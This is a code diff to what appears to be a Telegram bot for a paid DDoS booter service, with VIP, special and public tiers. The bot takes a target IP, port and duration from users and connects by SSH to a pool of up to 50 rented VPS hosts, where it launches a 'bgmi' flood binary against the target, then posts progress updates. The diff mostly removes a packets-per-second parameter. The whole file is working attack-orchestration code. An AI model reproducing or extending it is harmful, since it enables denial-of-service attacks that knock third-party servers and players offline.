@@ -27,9 +27,6 @@ VIP_MAX_THREADS = 15000
 MAX_DURATION = 2400
 SPECIAL_MAX_DURATION = 2000
 VIP_MAX_DURATION = 3000
-MAX_PPS = -1
-SPECIAL_MAX_PPS = -1
-VIP_MAX_PPS = -1
 ACTIVE_VPS_COUNT = 50
 BINARY_PATH = "/home/master/bgmi"
 BINARY_NAME = "bgmi"
@@ -1881,13 +1878,11 @@ def process_public_attack_args(message):
             
         ip, port, duration = args
         threads = 900  # Fixed thread count for public attacks
-        pps= -1 # Fixed PPS count for public attacks
         # Validate and enforce limits
         try:
             ipaddress.ip_address(ip)
             port = int(port)
             duration = int(duration)
-            pps = int(pps)
             if not 1 <= port <= 65535:
                 raise ValueError("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 (𝟭-𝟲𝟱𝟱𝟯𝟱)")
             
@@ -1896,7 +1891,7 @@ def process_public_attack_args(message):
                 raise ValueError("❌ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝟭𝟮𝟬𝘀 𝗳𝗼𝗿 𝗽𝘂𝗯𝗹𝗶𝗰 𝗮𝘁𝘁𝗮𝗰𝗸𝘀")
                 
             # Start attack with public limitations
-            start_attack(message, ip, port, duration, threads, pps, is_public=True)
+            start_attack(message, ip, port, duration, threads, is_public=True)
             
         except ValueError as e:
             raise ValueError(str(e))
@@ -1941,7 +1936,7 @@ def process_attack_args(message):
                 raise ValueError(f"❌ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 {max_duration}𝘀 {'(𝗩𝗜𝗣)' if is_vip else '(𝗦𝗽𝗲𝗰𝗶𝗮𝗹)' if is_special else ''}")
                 
             # Start attack
-            start_attack(message, ip, port, duration, threads, pps)
+            start_attack(message, ip, port, duration, threads,)
             
         except ValueError as e:
             raise ValueError(str(e))
@@ -1949,7 +1944,7 @@ def process_attack_args(message):
     except Exception as e:
         bot.reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")
 
-def execute_attack(vps, ip, port, duration, threads, pps):
+def execute_attack(vps, ip, port, duration, threads,):
     """Execute attack command on a VPS with proper timeout"""
     ssh = None
     try:
@@ -1958,7 +1953,7 @@ def execute_attack(vps, ip, port, duration, threads, pps):
         ssh.connect(vps[0], username=vps[1], password=vps[2], timeout=15)
         
         # Use timeout command to ensure attack stops after duration
-        cmd = f"timeout {duration} {BINARY_PATH} {ip} {port} {duration} {threads} {pps}"
+        cmd = f"timeout {duration} {BINARY_PATH} {ip} {port} {duration} {threads}"
         stdin, stdout, stderr = ssh.exec_command(cmd, timeout=10)
         exit_status = stdout.channel.recv_exit_status()
         
@@ -1972,7 +1967,7 @@ def execute_attack(vps, ip, port, duration, threads, pps):
         if ssh:
             ssh.close()
 
-def run_ssh_attack(vps, ip, port, duration, threads, pps, attack_id, attack_num, chat_id, user_id, is_vip, msg_id, country, flag, protection, is_public=False):
+def run_ssh_attack(vps, ip, port, duration, threads, attack_id, attack_num, chat_id, user_id, is_vip, msg_id, country, flag, protection, is_public=False):
     attack_id_vps = f"{attack_id}-{attack_num}"
     running_attacks[attack_id_vps] = {
         'user_id': user_id,
@@ -1992,7 +1987,7 @@ def run_ssh_attack(vps, ip, port, duration, threads, pps, attack_id, attack_num,
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(vps[0], username=vps[1], password=vps[2], timeout=15)
         
-        cmd = f"timeout {duration} {BINARY_PATH} {ip} {port} {duration} {threads} {pps} &"
+        cmd = f"timeout {duration} {BINARY_PATH} {ip} {port} {duration} {threads} &"
         ssh.exec_command(cmd)
         
         start_time = time.time()
@@ -2004,7 +1999,7 @@ def run_ssh_attack(vps, ip, port, duration, threads, pps, attack_id, attack_num,
             progress = min(100, int((elapsed / duration) * 100))
             
             if current_time - last_update >= 1:
-                update_attack_status(chat_id, msg_id, ip, port, duration, threads, pps, progress, country, flag, protection, is_vip, is_public)
+                update_attack_status(chat_id, msg_id, ip, port, duration, threads, progress, country, flag, protection, is_vip, is_public)
                 last_update = current_time
             
             if elapsed >= duration:
@@ -2012,7 +2007,7 @@ def run_ssh_attack(vps, ip, port, duration, threads, pps, attack_id, attack_num,
                 
             time.sleep(0.1)
         
-        update_attack_status(chat_id, msg_id, ip, port, duration, pps, threads, 100, country, flag, protection, is_vip, is_public)
+        update_attack_status(chat_id, msg_id, ip, port, duration, threads, 100, country, flag, protection, is_vip, is_public)
         
         # Mark this attack as completed
         running_attacks[attack_id_vps]['completed'] = True
@@ -2033,7 +2028,6 @@ def run_ssh_attack(vps, ip, port, duration, threads, pps, attack_id, attack_num,
 │ 🎯 Target: {ip}:{port}
 │ ⏱ Duration: {duration}s
 │ 🧵 Threads: {threads}0
-│       PPS {-1}
 │ {flag} {country}
 │ 🛡️ Protection: {protection}
 │
@@ -2058,7 +2052,7 @@ def run_ssh_attack(vps, ip, port, duration, threads, pps, attack_id, attack_num,
             for aid in target_attacks:
                 running_attacks.pop(aid, None)
 
-def update_attack_status(chat_id, msg_id, ip, port, duration, threads, pps, progress, country, flag, protection, is_vip, is_public):
+def update_attack_status(chat_id, msg_id, ip, port, duration, threads, progress, country, flag, protection, is_vip, is_public):
     attack_type = "🌐 PUBLIC" if is_public else "🔥 VIP" if is_vip else "⚡ SPECIAL"
     progress_bar = create_progress_bar(progress)
     elapsed_time = int(duration * (progress/100))
@@ -2070,7 +2064,6 @@ def update_attack_status(chat_id, msg_id, ip, port, duration, threads, pps, prog
 │ 🎯 Target: {ip}:{port}
 │ ⏱ Duration: {duration}s (Elapsed: {elapsed_time}s)
 │ 🧵 Threads: {threads}0
-│      PPS {-1}
 │ {flag} {country}
 │ 🛡️ Protection: {protection}
 │
@@ -2084,7 +2077,7 @@ def update_attack_status(chat_id, msg_id, ip, port, duration, threads, pps, prog
     except:
         pass
 
-def start_attack(message, ip, port, duration, threads, pps, is_public=False):
+def start_attack(message, ip, port, duration, threads, is_public=False):
     user_id = str(message.from_user.id)
     is_vip = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip')
     
@@ -2111,7 +2104,6 @@ def start_attack(message, ip, port, duration, threads, pps, is_public=False):
 │ 🎯 Target: {ip}:{port}
 │ ⏱ Duration: {duration}s
 │ 🧵 Threads: {threads}
-│      PPS {-1}
 │ {flag} {country}
 │ 🛡️ Protection: {protection}
 │
@@ -2126,7 +2118,7 @@ def start_attack(message, ip, port, duration, threads, pps, is_public=False):
         if vps_threads > 0:
             threading.Thread(
                 target=run_ssh_attack,
-                args=(vps, ip, port, duration, vps_threads, vps_pps, attack_id, i, 
+                args=(vps, ip, port, duration, vps_threads, attack_id, i, 
                       message.chat.id, user_id, is_vip, msg.message_id, 
                       country, flag, protection, is_public),
                 daemon=True
